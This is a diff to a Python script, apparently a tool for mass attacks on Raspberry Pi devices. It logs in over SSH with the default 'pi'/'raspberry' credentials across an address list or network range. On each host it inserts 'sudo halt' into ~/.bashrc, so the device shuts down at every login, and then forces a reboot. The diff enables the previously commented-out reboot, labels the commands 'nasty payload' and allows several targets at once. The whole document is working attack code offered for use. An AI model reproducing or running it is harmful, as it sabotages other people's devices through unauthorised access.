@@ -44,8 +44,8 @@ DEFAULT_USER = 'pi'
 DEFAULT_PASS = 'raspberry'
 DEFAULT_SSH_PORT = 22
 LOG = 'logs/{{{}}}.log'
-CORRUPT_STARTUP_FILE_1 = "sed -i \'4i\\\'$\'\\n\'\'sudo halt\'$\'\\n\' ~/.bashrc"
-CORRUPT_STARTUP_FILE_2 = "echo sudo halt >> ~/.bashrc"
+CORRUPT_BASHRC_1 = "sed -i \'4i\\\'$\'\\n\'\'sudo halt\'$\'\\n\' ~/.bashrc"
+CORRUPT_BASHRC_2 = "echo sudo halt >> ~/.bashrc"
 FORCE_REBOOT = "sudo reboot -f"
 
 logger = logging.getLogger()
@@ -176,24 +176,27 @@ def ssh_into_host(address, **kwargs):
 
 
 def corrupt_startup(ssh_client):
-    stdin, stdout, stderr = ssh_client.exec_command(CORRUPT_STARTUP_FILE_1)
-    stdin, stdout, stderr = ssh_client.exec_command(CORRUPT_STARTUP_FILE_2)
-    print stdout.read()
-    # stdin, stdout, stderr = ssh_client.exec_command(CORRUPT_STARTUP_FILE_3)
-    # stdin, stdout, stderr = ssh_client.exec_command(FORCE_REBOOT)
+    logger.info('Starting to eat...')
 
-    print stdout.read()
+    logger.info('Sending first nasty payload: ' + CORRUPT_BASHRC_1)
+    ssh_client.exec_command(CORRUPT_BASHRC_1)
+
+    logger.info('Sending second nasty payload: ' + CORRUPT_BASHRC_2)
+    ssh_client.exec_command(CORRUPT_BASHRC_2)
+
+    logger.info('Forcing reboot...')
+    ssh_client.exec_command(FORCE_REBOOT)
 
 
 def main():
     start_logging()
     args = parse_arguments()
     if args.address:
-        ip_list_to_check = [args.address]
+        ip_list_to_check = args.address.split(',')
     elif args.range:
         ip_list_to_check = netaddr.IPNetwork(args.range)
 
-    print_intro(ip_list_to_check)
+    print_intro()
 
     for host in ip_list_to_check:
         # TODO ssh into specific port
@@ -203,7 +206,7 @@ def main():
 
         client = ssh_into_host(host)
         corrupt_startup(client)
-        client.close()
+        # client.close()
 
     logging.info('Execution done')
 
